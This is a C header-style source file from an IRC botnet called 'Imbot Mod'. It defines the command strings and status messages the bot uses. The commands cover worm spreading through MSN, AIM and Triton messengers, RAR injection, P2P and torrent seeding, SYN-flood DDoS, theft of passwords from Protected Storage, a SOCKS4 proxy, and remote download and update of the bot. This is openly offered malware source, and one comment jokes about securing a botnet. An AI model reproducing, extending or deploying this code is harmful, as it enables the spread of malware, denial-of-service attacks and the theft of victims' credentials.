/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
Imbot Mod - A c&p bot made by h1t3m and modified by Damming
*/

///////////////////////////////////////////////
// Commands
/////////////BASIC/////////////
const char get_auth[]			= "login";
const char cmd_join[]			= "join";
const char cmd_part[]			= "part";
const char get_mnd[]			= "dl.start";
const char cmd_dlstop[]			= "dl.stop";
const char get_upd[]			= "update";
const char cmd_remove[]			= "remove";
/////////////SPREADS///////////
const char cmd_msnspam[]		= "msn.msg";        // no email at end 
const char cmd_msnemail[]		= "msn.msgemail";   // email at end
const char cmd_msnstop[]		= "msn.stop";
const char cmd_msnsendzip[]		= "msn.sendzip";    
const char cmd_msnstopzip[]		= "msn.stopzip";
const char cmd_timspread_1[]    = "triton.msg";
const char cmd_timspread_2[]    = "triton.stop";
const char cmd_aimspread_1[]    = "aim.msg";
const char cmd_aimspread_2[]    = "aim.stop";
const char cmd_winrar[]			= "rarinject";
const char cmd_p2pspread[]      = "p2p";
const char cmd_seed[]			= "seed.utorrent";
/////////////OTHER////////////
const char cmd_ddos_1[]	        = "supersyn";
const char cmd_ddos_2[]	        = "supersyn.stop";
const char cmd_pstore_1[]	    = "pstore";
const char cmd_pstore_2[]	    = "pstore.search";
const char cmd_pstore_3[]	    = "pstore.stop";
const char cmd_socks4[]	        = "socks4";
///////////////////////////////

/*
// Fake commands (who needs this shit? learn to secure your botnet!)
const char cmd_fakelogin[]		= "login";
const char cmd_fake_remove[]    = "remove";
const char cmd_fakedownload[]   = "download";
const char cmd_fakeupdate[]     = "update";
*/
///////////////////////////////

// Command Titles
char main_title[]		= "[IMBot]:";
char threads_title[]	= "[Thread]:";
char process_title[]	= "[Proc]:";
char irc_title[]		= "[Irc]:";
char update_title[]		= "[Update]:";
char download_title[]	= "[Dl]:";
char btkill_title[]		= "[BtKill]:";
char sock4_title[]		= "[Sock4]:";
char ddos_title[]		= "[DDOS SYN]:";
char imspread_title[]	= "[IM]:";
char aimspread_title[]  = "[Aim]:";
char timspread_title[]	= "[Triton]:";
char seed_title[]		= "[Seed]:";
char pstore_title[]		= "[Pstore]:";
///////////////////////////////
// Strings
char str_auth_good[]	= "%s Welcome.";
char str_auth_full[]	= "%s Fail.";
char str_thread_alr[]	= "%s %s already running: <%d>";
char str_thread_fail[]	= "%s Fail start %s, err: <%d>";
char str_kick_msg[]		= "Cant kick me %s :P";
char str_auth_ali[]		= "%s logged in.";
char str_quit_rem[]		= "[Remove]: Removed by: %s!%s@%s.";
char str_noadvapi[]		= "%s Advapidll Failed.";
char str_nopstore[]		= "%s PStoredll Failed.";
char str_main_thread[]	= "%s Main thread.";
char str_bad_format[]	= "%s mis param.";
char str_msn_msg[]		= "[Msn]: Message sent.";
char str_quit_upd[]		= "[Update]: Updating to new bin.";
///////////////////////////////